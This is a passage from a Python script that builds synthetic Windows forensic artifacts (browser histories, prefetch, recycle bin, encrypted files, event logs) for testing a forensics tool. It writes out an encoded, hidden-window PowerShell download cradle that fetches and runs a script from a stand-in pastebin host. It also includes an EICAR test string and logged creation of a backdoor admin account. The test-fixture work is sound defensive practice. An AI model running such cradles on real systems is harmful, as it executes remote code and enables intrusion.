"""Builds the synthetic user artifacts placed inside the DFIP test disk image.

Everything here is fabricated test data for exercising the parsers. The registry hives are written
separately by make_hives.py (with hivex).
"""
import io
import json
import random
import sqlite3
import struct
import sys
import zipfile
import zlib
from datetime import datetime, timezone
from pathlib import Path

# Writers for the Windows artifact formats (shared with the backend unit tests).
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'backend' / 'tests' / 'fixtures'))
import winfmt  # noqa: E402

OUT = Path(sys.argv[1])

CHROME_EPOCH_OFFSET = 11_644_473_600  # seconds between 1601-01-01 and 1970-01-01


def chrome_ts(dt):
    return int((dt.timestamp() + CHROME_EPOCH_OFFSET) * 1_000_000)


def prtime(dt):
    return int(dt.timestamp() * 1_000_000)


def utc(*a):
    return datetime(*a, tzinfo=timezone.utc)


def write(rel, data):
    p = OUT / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, str):
        data = data.encode()
    p.write_bytes(data)
    return p


# History rows alice deleted (id, address, title, time, search term). Chrome's own SQLite zeroes deleted rows (secure delete);
# these are written with it off, as other SQLite databases do, so they stay in the file's free space for recovery.
CHROME_DELETED = [
    (5, 'https://www.google.com/search?q=how+to+permanently+delete+files+from+usb', 'how to permanently delete files from usb - Google Search',
     utc(2026, 9, 1, 14, 16, 2), 'how to permanently delete files from usb'),
    (6, 'https://filetransfer.example.net/d/7Hq2xK', 'Your file is ready - Anonymous File Upload', utc(2026, 9, 1, 14, 22, 18), None),
    (7, 'https://www.google.com/search?q=clear+chrome+history+for+one+day', 'clear chrome history for one day - Google Search',
     utc(2026, 9, 1, 14, 38, 51), 'clear chrome history for one day'),
]


def chrome_history(path):
    path.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(path)
    db.execute('PRAGMA secure_delete=OFF')
    db.executescript("""
        CREATE TABLE urls(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, visit_count INTEGER DEFAULT 0 NOT NULL,
                          typed_count INTEGER DEFAULT 0 NOT NULL, last_visit_time INTEGER NOT NULL, hidden INTEGER DEFAULT 0 NOT NULL);
        CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER NOT NULL, visit_time INTEGER NOT NULL, from_visit INTEGER, transition INTEGER DEFAULT 0 NOT NULL);
        CREATE TABLE downloads(id INTEGER PRIMARY KEY, guid VARCHAR NOT NULL, current_path LONGVARCHAR NOT NULL, target_path LONGVARCHAR NOT NULL,
                               start_time INTEGER NOT NULL, received_bytes INTEGER NOT NULL, total_bytes INTEGER NOT NULL, state INTEGER NOT NULL,
                               end_time INTEGER NOT NULL, opened INTEGER NOT NULL, tab_url VARCHAR NOT NULL, mime_type VARCHAR(255) NOT NULL);
    """)
    urls = [
        (1, 'https://mail.example.com/inbox', 'Inbox - Mail', 12, utc(2026, 9, 1, 8, 55)),
        (2, 'https://www.google.com/search?q=how+to+wipe+usb+drive', 'how to wipe usb drive - Google Search', 2, utc(2026, 9, 1, 10, 2)),
        (3, 'https://filetransfer.example.net/upload', 'Anonymous File Upload', 3, utc(2026, 9, 1, 10, 20)),
        (4, 'https://intranet.corp.example/hr/payroll', 'Payroll Portal', 5, utc(2026, 9, 1, 9, 40)),
    ]
    for i, url, title, count, ts in urls:
        db.execute('INSERT INTO urls VALUES (?,?,?,?,0,?,0)', (i, url, title, count, chrome_ts(ts)))
        db.execute('INSERT INTO visits(url, visit_time) VALUES (?,?)', (i, chrome_ts(ts)))
    db.execute('INSERT INTO downloads VALUES (1,?,?,?,?,?,?,1,?,1,?,?)', (
        'd1a3c1e2-0000-4000-8000-000000000001',
        r'C:\Users\alice\Downloads\SecureDelete.exe', r'C:\Users\alice\Downloads\SecureDelete.exe',
        chrome_ts(utc(2026, 9, 1, 10, 5)), 482_304, 482_304, chrome_ts(utc(2026, 9, 1, 10, 5, 9)),
        'https://tools.example.org/securedelete', 'application/octet-stream'))
    db.execute('CREATE TABLE keyword_search_terms (keyword_id INTEGER NOT NULL,url_id INTEGER NOT NULL,lower_term LONGVARCHAR NOT NULL,'
               'term LONGVARCHAR NOT NULL)')
    db.execute("INSERT INTO keyword_search_terms VALUES (2, 2, 'how to wipe usb drive', 'how to wipe usb drive')")
    db.commit()
    for i, url, title, ts, term in CHROME_DELETED:
        db.execute('INSERT INTO urls VALUES (?,?,?,1,0,?,0)', (i, url, title, chrome_ts(ts)))
        db.execute('INSERT INTO visits(url, visit_time) VALUES (?,?)', (i, chrome_ts(ts)))
        if term:
            db.execute('INSERT INTO keyword_search_terms VALUES (2, ?, ?, ?)', (i, term, term))
    db.commit()
    db.execute('DELETE FROM urls WHERE id >= 5')
    db.execute('DELETE FROM visits WHERE url >= 5')
    db.execute('DELETE FROM keyword_search_terms WHERE url_id >= 5')
    db.commit()
    db.close()


# A search alice made in Firefox and deleted from its history. Firefox keeps places.sqlite in WAL mode: the row is still in an
# older copy of its page in places.sqlite-wal, written before the deletion and not yet checkpointed.
FIREFOX_DELETED = (3, 'https://www.bing.com/search?q=securedelete+wipe+free+space', 'securedelete wipe free space - Search',
                   utc(2026, 9, 1, 14, 17, 25))


def firefox_places(path):
    """places.sqlite and its write-ahead log, copied while the database is open (as on a running computer)."""
    import shutil
    import tempfile
    path.parent.mkdir(parents=True, exist_ok=True)
    work = Path(tempfile.mkdtemp())
    live = work / 'places.sqlite'
    db = sqlite3.connect(live)
    db.execute('PRAGMA secure_delete=OFF')
    db.execute('PRAGMA journal_mode=WAL')
    db.execute('PRAGMA wal_autocheckpoint=0')
    db.executescript("""
        CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR,
                                visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL,
                                frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER, guid TEXT);
        CREATE TABLE moz_anno_attributes(id INTEGER PRIMARY KEY, name VARCHAR(32) UNIQUE NOT NULL);
        CREATE TABLE moz_annos(id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, content LONGVARCHAR,
                               flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0,
                               dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0);
    """)
    db.execute("INSERT INTO moz_places(id,url,title,visit_count,last_visit_date) VALUES (1,'https://pastebin.example.com/raw/x9f2','Paste',1,?)",
               (prtime(utc(2026, 9, 1, 10, 31)),))
    db.execute("INSERT INTO moz_places(id,url,title,visit_count,last_visit_date) VALUES (2,'https://cdn.example.org/tools/archiver.zip','archiver.zip',1,?)",
               (prtime(utc(2026, 9, 1, 10, 33)),))
    db.execute("INSERT INTO moz_anno_attributes VALUES (1,'downloads/destinationFileURI')")
    db.execute("INSERT INTO moz_annos(place_id,anno_attribute_id,content,dateAdded) VALUES (2,1,'file:///C:/Users/alice/Downloads/archiver.zip',?)",
               (prtime(utc(2026, 9, 1, 10, 33, 5)),))
    db.execute('CREATE TABLE moz_bookmarks (id INTEGER PRIMARY KEY, type INTEGER, fk INTEGER DEFAULT NULL, parent INTEGER, position INTEGER, '
               'title LONGVARCHAR, keyword_id INTEGER, folder_type TEXT, dateAdded INTEGER, lastModified INTEGER, guid TEXT, '
               'syncStatus INTEGER NOT NULL DEFAULT 0, syncChangeCounter INTEGER NOT NULL DEFAULT 1)')
    created = prtime(utc(2025, 11, 3, 8, 30))
    for row in [(1, 2, None, 0, 0, '', 'root________'), (2, 2, None, 1, 0, 'menu', 'menu________'), (3, 2, None, 1, 1, 'toolbar', 'toolbar_____'),
                (4, 2, None, 1, 2, 'tags', 'tags________'), (5, 2, None, 1, 3, 'unfiled', 'unfiled_____')]:
        db.execute('INSERT INTO moz_bookmarks(id,type,fk,parent,position,title,guid,dateAdded,lastModified) VALUES (?,?,?,?,?,?,?,?,?)',
                   row + (created, created))
    db.execute("INSERT INTO moz_bookmarks(id,type,fk,parent,position,title,guid,dateAdded,lastModified) VALUES (6,1,1,3,0,'Paste','pAsTe0000001',?,?)",
               (prtime(utc(2026, 9, 1, 14, 31, 40)), prtime(utc(2026, 9, 1, 14, 31, 40))))
    db.commit()
    db.execute('PRAGMA wal_checkpoint(TRUNCATE)')
    i, url, title, ts = FIREFOX_DELETED
    db.execute('INSERT INTO moz_places(id,url,title,visit_count,last_visit_date) VALUES (?,?,?,1,?)', (i, url, title, prtime(ts)))
    db.commit()
    db.execute('DELETE FROM moz_places WHERE id = ?', (i,))
    db.commit()
    shutil.copyfile(live, path)
    shutil.copyfile(work / 'places.sqlite-wal', path.with_name('places.sqlite-wal'))
    db.close()
    shutil.rmtree(work, ignore_errors=True)


SETUPAPI = """[Device Install Log]
     OS Version = 6.1.7601
     Service Pack = 1.0
     Suite = 0x0100
     ProductType = 1
     Architecture = amd64

[BeginLog]

>>>  [Device Install (Hardware initiated) - USB\\VID_03F0&PID_3207\\AA951D0000007252]
>>>  Section start 2011/04/03 21:15:02.411
     ump: Creating Install Process: DrvInst.exe 21:15:02.411
<<<  Section end 2011/04/03 21:15:05.117
<<<  [Exit status: SUCCESS]


>>>  [Device Install (Hardware initiated) - USBSTOR\\Disk&Ven_HP&Prod_v100w&Rev_1024\\AA951D0000007252&0]
>>>  Section start 2011/04/03 21:15:05.402
     ump: Creating Install Process: DrvInst.exe 21:15:05.402
<<<  Section end 2011/04/03 21:15:07.960
<<<  [Exit status: SUCCESS]


>>>  [Device Install (Hardware initiated) - USBSTOR\\Disk&Ven_SanDisk&Prod_Cruzer_Blade&Rev_1.00\\4C530001230518109141&0]
>>>  Section start 2026/09/01 10:12:44.020
<<<  Section end 2026/09/01 10:12:46.581
<<<  [Exit status: SUCCESS]

"""


PAYROLL = 'employee,iban,salary\n' + ''.join(f'emp{i:03d},DE89370400440532013{i:03d},{50000 + i * 1000}\n' for i in range(60))

# Windows activity on 2026-09-01 (all times UTC): SecureDelete.exe runs, the payroll export is opened from
# the SanDisk drive (E:, connected 14:12:44), moved to the Recycle Bin, and SecureDelete runs again.
# FAT keeps modification times to 2 seconds, so the times stamped on files are even seconds.
RECYCLE_SID = 'S-1-5-21-3623811015-3361044348-30300820-1001'
VOLUME = r'\VOLUME{01dc1f2a3b4c5d6e-5e1f22c4}'
SECUREDELETE = VOLUME + r'\USERS\ALICE\DOWNLOADS\SECUREDELETE.EXE'
PREFETCH_NAME = f'SECUREDELETE.EXE-{winfmt.prefetch_hash(SECUREDELETE):08X}.pf'


def windows_activity():
    write(f'$Recycle.Bin/{RECYCLE_SID}/$I3K9D2A.csv',
          winfmt.recycle_bin_index(r'C:\Users\alice\Documents\payroll-export.csv', len(PAYROLL), utc(2026, 9, 1, 14, 15, 20)))
    write(f'$Recycle.Bin/{RECYCLE_SID}/$R3K9D2A.csv', PAYROLL)
    write('Users/alice/AppData/Roaming/Microsoft/Windows/Recent/payroll-export.csv.lnk', winfmt.shell_link(
        r'E:\payroll-export.csv', size=len(PAYROLL), created=utc(2026, 9, 1, 14, 13, 10), modified=utc(2026, 9, 1, 9, 41, 2),
        accessed=utc(2026, 9, 1, 14, 14, 6), drive_type=winfmt.DRIVE_REMOVABLE, drive_serial=0x6A3C91F2,
        volume_label='CRUZER', working_dir='E:\\', machine_id='laptop-07'))
    write(f'Windows/Prefetch/{PREFETCH_NAME}', winfmt.prefetch_v30(
        'SECUREDELETE.EXE', run_times=[utc(2026, 9, 1, 14, 18, 30), utc(2026, 9, 1, 10, 6, 2)], run_count=2,
        files=[VOLUME + r'\WINDOWS\SYSTEM32\NTDLL.DLL', VOLUME + r'\WINDOWS\SYSTEM32\KERNEL32.DLL', SECUREDELETE,
               VOLUME + r'\USERS\ALICE\DOCUMENTS\PAYROLL-EXPORT.CSV'],
        volume_path=VOLUME, volume_serial=0x5E1F22C4, volume_created=utc(2025, 11, 3, 8, 0, 0)))


def png(width=96, height=64) -> bytes:
    """A small grey 'whiteboard' with blue lines, for the file preview."""
    rows = b''
    for y in range(height):
        row = b'\0'
        for x in range(width):
            line = y % 12 == 6 and 8 < x < width - 8
            row += bytes((29, 78, 216)) if line else bytes((235, 238, 242))
        rows += row
    chunk = lambda kind, data: struct.pack('>I', len(data)) + kind + data + struct.pack('>I', zlib.crc32(kind + data))
    return (b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', zlib.compress(rows)) + chunk(b'IEND', b''))


def pdf(text='Offer letter - Alice Example - Senior Analyst') -> bytes:
    """A one-page PDF with one line of text, for the file preview."""
    stream = f'BT /F1 18 Tf 72 720 Td ({text}) Tj ET'.encode()
    objects = [b'<< /Type /Catalog /Pages 2 0 R >>', b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
               b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
               b'<< /Length %d >>\nstream\n' % len(stream) + stream + b'\nendstream',
               b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>']
    out, offsets = b'%PDF-1.4\n', []
    for i, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b'%d 0 obj\n' % i + body + b'\nendobj\n'
    xref = len(out)
    out += b'xref\n0 %d\n0000000000 65535 f \n' % (len(objects) + 1) + b''.join(b'%010d 00000 n \n' % o for o in offsets)
    return out + b'trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n' % (len(objects) + 1, xref)


def docx(text) -> bytes:
    """A minimal Word document (Office Open XML): one paragraph of text."""
    w = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
    parts = {
        '[Content_Types].xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        '_rels/.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/></Relationships>',
        'word/document.xml': f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="{w}">'
        f'<w:body><w:p><w:r><w:t>{text}</w:t></w:r></w:p></w:body></w:document>',
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, xml in parts.items():
            z.writestr(name, xml)
    return buf.getvalue()


def encrypted_docx(text, password) -> bytes:
    """The document above, password-protected the way Word does it (an OLE container with EncryptedPackage)."""
    from msoffcrypto.format.ooxml import OOXMLFile
    out = io.BytesIO()
    OOXMLFile(io.BytesIO(docx(text))).encrypt(password, out)
    return out.getvalue()


def encrypted_zip(members, password) -> bytes:
    """A ZIP whose entries are AES-encrypted (WinZip AE-2, as 7-Zip and WinZip write them)."""
    import pyzipper
    buf = io.BytesIO()
    with pyzipper.AESZipFile(buf, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as z:
        z.setpassword(password)
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


# The EICAR anti-virus test file, assembled at run time so this source file is not itself detected.
EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'


def hidden_files():
    """Files whose names hide what they are, or whose content is encrypted (file processing, Phase 2)."""
    # The payroll export, copied and renamed to look like a photo.
    write('Users/alice/Pictures/holiday.jpg', PAYROLL)
    # A password-protected ZIP holding another copy (entries AES-encrypted).
    write('Users/alice/Documents/private.zip', encrypted_zip({'payroll-export.csv': PAYROLL}, b'summer2026'))
    # A password-protected Word document.
    write('Users/alice/Documents/salary-review.docx',
          encrypted_docx('Salary review 2026 - confidential - Alice Example', 'summer2026'))
    # 2 MiB of random bytes with no header: what an encrypted container (for example VeraCrypt) looks like.
    write('Users/alice/Documents/vault.dat', random.Random(2026).randbytes(2 << 20))
    # A known-bad test file with a misleading extension.
    write('Users/alice/Downloads/eicar.com', EICAR)


# Content search and found data (Phase 3). Every identifier here is a published test value; the mistyped card
# number fails its Luhn check and must not be reported.
CONTACTS = """Personal contacts - keep private
Zoë Martin <zoe.martin@example.org>, +44 20 7946 0958
Bank (personal): GB82 WEST 1234 5698 7654 32
Card on file: 4111 1111 1111 1111 (exp 09/28)
Old card, mistyped: 4111 1111 1111 1112
Aadhaar: 2345 6789 0124
BTC: 1BoatSLRHtKNngkdXEeobR76b53LETtpyT
ETH: 0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed
File server 10.20.30.40, portal https://intranet.corp.example/hr/payroll
"""
HANDOVER = 'Handover: send the payroll export to alice.personal@example.net before Friday. Salary account DE89370400440532013000.'
MEETING_RTF = (r"{\rtf1\ansi\deff0{\fonttbl{\f0 Calibri;}}{\*\generator Riched20 10.0.19041;}" "\r\n"
               r"\pard Meeting notes 1 September: the USB drive CRUZER holds the export. Caf\'e9 at 10:00.\par" "\r\n"
               r"Call +1 202 555 0143 about the transfer.\par" "\r\n}")
UTF16_NOTE = 'Reminder: wipe the SanDisk drive after copying payroll-export.csv to it.\r\n'
BUDGET_ODT_TEXT = ('Budget Q3', 'Transfer 12,400 EUR to GB82 WEST 1234 5698 7654 32 before the audit.')


def odt(heading, paragraph) -> bytes:
    """A minimal OpenDocument text file: the stored mimetype member first, then content.xml."""
    content = ('<?xml version="1.0" encoding="UTF-8"?><office:document-content '
               'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
               'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2"><office:body><office:text>'
               f'<text:h text:outline-level="1">{heading}</text:h><text:p>{paragraph}</text:p>'
               '</office:text></office:body></office:document-content>')
    manifest = ('<?xml version="1.0" encoding="UTF-8"?><manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" '
                'manifest:version="1.2"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>'
                '<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/></manifest:manifest>')
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr(zipfile.ZipInfo('mimetype'), 'application/vnd.oasis.opendocument.text')  # stored, uncompressed
        z.writestr('content.xml', content, zipfile.ZIP_DEFLATED)
        z.writestr('META-INF/manifest.xml', manifest, zipfile.ZIP_DEFLATED)
    return buf.getvalue()


def content_files():
    write('Users/alice/Documents/contacts.txt', CONTACTS.encode('utf-8'))
    write('Users/alice/Documents/handover.docx', docx(HANDOVER))
    write('Users/alice/Documents/meeting-notes.rtf', MEETING_RTF)
    write('Users/alice/Documents/notes-utf16.txt', b'\xff\xfe' + UTF16_NOTE.encode('utf-16-le'))
    write('Users/alice/Documents/budget.odt', odt(*BUDGET_ODT_TEXT))


# Archives and embedded files (Phase 4).
README_TXT = 'Backup of the September payroll export, made before the transfer.\n'
Q3_SALARIES = 'name,email,salary\nalice,alice.personal@example.net,72000\nbob,bob.smith@example.org,68000\n'
PAYROLL_SUMMARY = ('Q3 payroll summary for finance.team@example.com: total 4,140,000 EUR, '
                   'account FR76 3000 6000 0112 3456 7890 189.\n')
Q3_DOCX_TEXT = 'Q3 payroll summary attached as an embedded file. Contact finance.team@example.com.'
TRANSFER_DETAILS = 'Transfer approved by alice: IBAN GB82 WEST 1234 5698 7654 32, reference PAY-2026-09.\n'


def seven_zip(members: dict) -> bytes:
    """A 7z archive made with the 7-Zip command line (installed by make-test-image.sh)."""
    import subprocess
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        src = Path(tmp) / 'src'
        for name, data in members.items():
            (src / name).parent.mkdir(parents=True, exist_ok=True)
            (src / name).write_bytes(data.encode() if isinstance(data, str) else data)
        out = Path(tmp) / 'archive.7z'
        subprocess.run(['7z', 'a', '-bd', '-mtm=off', str(out), '.'], cwd=src, check=True, capture_output=True)
        return out.read_bytes()


def docx_with_embeddings(text: str, media: dict, embeddings: dict) -> bytes:
    """A Word document with pictures (word/media) and embedded objects (word/embeddings)."""
    plain = zipfile.ZipFile(io.BytesIO(docx(text)))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for info in plain.infolist():
            data = plain.read(info)
            if info.filename == '[Content_Types].xml':
                data = data.replace(b'<Default Extension="xml"', b'<Default Extension="png" ContentType="image/png"/>'
                                    b'<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>'
                                    b'<Default Extension="xml"')
            z.writestr(info.filename, data)
        for name, data in media.items():
            z.writestr(f'word/media/{name}', data)
        for name, data in embeddings.items():
            z.writestr(f'word/embeddings/{name}', data)
    return buf.getvalue()


def pdf_with_attachment(name: str, data: bytes) -> bytes:
    from pypdf import PdfReader, PdfWriter
    writer = PdfWriter(clone_from=PdfReader(io.BytesIO(pdf('Bank statement - September 2026 - see the attached transfer details'))))
    writer.add_attachment(name, data)
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def container_files():
    write('Users/alice/Documents/export-backup.zip', _plain_zip({
        'payroll-export.csv': PAYROLL, 'notes/readme.txt': README_TXT,
        'archive.7z': seven_zip({'q3-salaries.csv': Q3_SALARIES})}))
    ole = winfmt.compound_file({'\x01Ole10Native': winfmt.ole10native('payroll-summary.txt', PAYROLL_SUMMARY.encode())})
    write('Users/alice/Documents/q3-payroll.docx', docx_with_embeddings(Q3_DOCX_TEXT, {'image1.png': png()}, {'oleObject1.bin': ole}))
    write('Users/alice/Documents/statement.pdf', pdf_with_attachment('transfer-details.txt', TRANSFER_DETAILS.encode()))


def _plain_zip(members: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


# Windows event logs (Phase 6), written by backend/tests/fixtures/evtx.py. The story they add: alice logs on at 08:52,
# a "Secure Delete Helper" service is installed from her AppData at 10:07, she logs off for lunch and back on at 13:28,
# plugs in the SanDisk drive at 14:12:44, runs an encoded PowerShell download cradle at 14:24:30, clears the Security
# log at 14:25 (so the earlier Security events are gone), unlocks at 14:30, removes the drive at 14:41:10; someone at
# 192.168.1.66 tries the administrator password three times (too few to count as brute force); a backup_admin account
# is created and added to Administrators at 15:10 and deleted at 18:30; alice logs off and shuts down at 18:42.
ALICE_SID = 'S-1-5-21-3623811015-3361044348-30300820-1001'
BACKDOOR_SID = 'S-1-5-21-3623811015-3361044348-30300820-1002'
PS_SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("https://pastebin.example.com/raw/x9f2")'
PS_COMMAND = 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ' + __import__('base64').b64encode(PS_SCRIPT.encode('utf-16-le')).decode()
SANDISK_SERIAL = '4C530001230518109141'
LOGS = 'Windows/System32/winevt/Logs'
AUDIT_SUCCESS, AUDIT_FAILURE, CLASSIC = 0x8020000000000000, 0x8010000000000000, 0x80000000000000


def event_logs():
    import evtx as ev
    t = lambda h, m, s=0: utc(2026, 9, 1, h, m, s)
    sec = ('Security', 'Microsoft-Windows-Security-Auditing', '{54849625-5478-4994-A5BA-3E3B0328C30D}')

    def s(eid, when, data, task, keywords=AUDIT_SUCCESS, **kw):  # Security audit events are logged at level 0 (Log Always)
        return ev.Event(*sec, eid, when, data, level=0, task=task, keywords=keywords, process_id=684, thread_id=1220, **kw)

    who = {'SubjectUserSid': ALICE_SID, 'SubjectUserName': 'alice', 'SubjectDomainName': 'LAPTOP-07', 'SubjectLogonId': '0x3e7a12'}
    security = [
        # A cleared log starts again at record 1 with the clearing event, which names who cleared it.
        ev.Event('Security', 'Microsoft-Windows-Eventlog', '{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}', 1102, t(14, 25), {},
                 task=104, keywords=0x4020000000000000, process_id=1344, thread_id=5932,
                 user_data=('LogFileCleared', 'http://manifests.microsoft.com/win/2004/08/windows/eventlog', who)),
        s(4624, t(14, 30, 12), {'SubjectUserSid': 'S-1-5-18', 'SubjectUserName': 'LAPTOP-07$', 'SubjectDomainName': 'WORKGROUP',
                                 'SubjectLogonId': '0x3e7', 'TargetUserSid': ALICE_SID, 'TargetUserName': 'alice', 'TargetDomainName': 'LAPTOP-07',
                                 'TargetLogonId': '0x3e7a12', 'LogonType': '7', 'LogonProcessName': 'User32', 'AuthenticationPackageName': 'Negotiate',
                                 'WorkstationName': 'LAPTOP-07', 'ProcessName': 'C:\\Windows\\System32\\svchost.exe', 'IpAddress': '127.0.0.1',
                                 'IpPort': '0'}, 12544),
    ] + [
        s(4625, t(15, 2, second), {'SubjectUserSid': 'S-1-0-0', 'TargetUserName': 'administrator', 'TargetDomainName': 'LAPTOP-07',
                                    'Status': '0xc000006d', 'FailureReason': '%%2313', 'SubStatus': '0xc000006a', 'LogonType': '3',
                                    'LogonProcessName': 'NtLmSsp', 'AuthenticationPackageName': 'NTLM', 'WorkstationName': 'KALI',
                                    'IpAddress': '192.168.1.66', 'IpPort': '49812'}, 12544, AUDIT_FAILURE)
        for second in (10, 25, 41)
    ] + [
        s(4720, t(15, 10, 5), dict(who, TargetUserName='backup_admin', TargetDomainName='LAPTOP-07', TargetSid=BACKDOOR_SID,
                                   SamAccountName='backup_admin', UserAccountControl='%%2080 %%2082 %%2084'), 13824),
        s(4732, t(15, 10, 20), dict(who, MemberName='-', MemberSid=BACKDOOR_SID, TargetUserName='Administrators', TargetDomainName='Builtin',
                                    TargetSid='S-1-5-32-544'), 13826),
        s(4726, t(18, 30), dict(who, TargetUserName='backup_admin', TargetDomainName='LAPTOP-07', TargetSid=BACKDOOR_SID), 13824),
        s(4647, t(18, 41, 30), {'TargetUserSid': ALICE_SID, 'TargetUserName': 'alice', 'TargetDomainName': 'LAPTOP-07', 'TargetLogonId': '0x3e7a12'},
          12545),
    ]
    winlogon = ('System', 'Microsoft-Windows-Winlogon', '{DBE9B383-7CF3-4331-91CC-A3CB16A3B538}')
    session = {'TSId': '1', 'UserSid': ALICE_SID}
    system = [
        ev.Event('System', 'EventLog', '', 6005, t(8, 50, 2), [], keywords=CLASSIC),
        ev.Event(*winlogon, 7001, t(8, 52, 10), session, task=1101, user_sid='S-1-5-18'),
        ev.Event('System', 'Service Control Manager', '{555908d1-a6d7-4695-8e1e-26931d2012f4}', 7045, t(10, 7, 30),
                 {'ServiceName': 'Secure Delete Helper', 'ImagePath': 'C:\\Users\\alice\\AppData\\Roaming\\sdsvc.exe',
                  'ServiceType': 'user mode service', 'StartType': 'auto start', 'AccountName': 'LocalSystem'},
                 keywords=CLASSIC, user_sid=ALICE_SID, process_id=712, thread_id=3344),
        ev.Event(*winlogon, 7002, t(12, 31, 4), session, task=1102, user_sid='S-1-5-18'),
        ev.Event(*winlogon, 7001, t(13, 28, 41), session, task=1101, user_sid='S-1-5-18'),
        ev.Event('System', 'User32', '{b0aa8734-56f7-41cc-b2f4-de228e98b946}', 1074, t(18, 42),
                 {'param1': 'C:\\Windows\\Explorer.EXE (LAPTOP-07)', 'param2': 'LAPTOP-07', 'param3': 'Other (Unplanned)', 'param4': '0x0',
                  'param5': 'power off', 'param6': '', 'param7': 'LAPTOP-07\\alice'}, keywords=CLASSIC, user_sid=ALICE_SID),
        ev.Event('System', 'EventLog', '', 6006, t(18, 42, 5), [], keywords=CLASSIC),
    ]
    ps_op = [ev.Event('Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-PowerShell', '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}',
                      4104, t(14, 24, 31), {'MessageNumber': '1', 'MessageTotal': '1', 'ScriptBlockText': PS_SCRIPT,
                                            'ScriptBlockId': '{5b1c7e9a-2d4f-4b8e-9c3a-1f0e2d3c4b5a}', 'Path': ''},
                      level=3, task=2, opcode=15, keywords=0x0, user_sid=ALICE_SID, process_id=7716, thread_id=6120)]

    def details(new, previous):  # the third value of a classic PowerShell engine event: key=value lines
        return (f'NewEngineState={new}\r\n\tPreviousEngineState={previous}\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n'
                '\tHostVersion=5.1.19041.4780\r\n\tHostId=3c9b8d0e-6a7f-4e21-9b1c-2d3e4f5a6b7c\r\n'
                f'\tHostApplication={PS_COMMAND}\r\n\tEngineVersion=5.1.19041.4780\r\n\tRunspaceId=8f0d6f3e-1b2c-4d5e-9f6a-7b8c9d0e1f2a\r\n')
    ps_classic = [ev.Event('Windows PowerShell', 'PowerShell', '', 400, t(14, 24, 30), ['Available', 'None', details('Available', 'None')],
                           task=4, keywords=CLASSIC, process_id=7716, thread_id=0),
                  ev.Event('Windows PowerShell', 'PowerShell', '', 403, t(14, 24, 33), ['Stopped', 'Available', details('Stopped', 'Available')],
                           task=4, keywords=CLASSIC, process_id=7716, thread_id=0)]
    disk = {'Version': '2', 'DiskNumber': '1', 'Flags': '0x0', 'Characteristics': '0x100000', 'IsSystem': 'false', 'IsBoot': 'false',
            'BusType': '7', 'Manufacturer': 'SanDisk', 'Model': 'Cruzer Blade', 'Revision': '1.00', 'SerialNumber': SANDISK_SERIAL,
            'Location': 'Integrated : Adapter 0 : Port 0 : Target 0 : LUN 0', 'ParentId': f'USB\\VID_0781&PID_5567\\{SANDISK_SERIAL}',
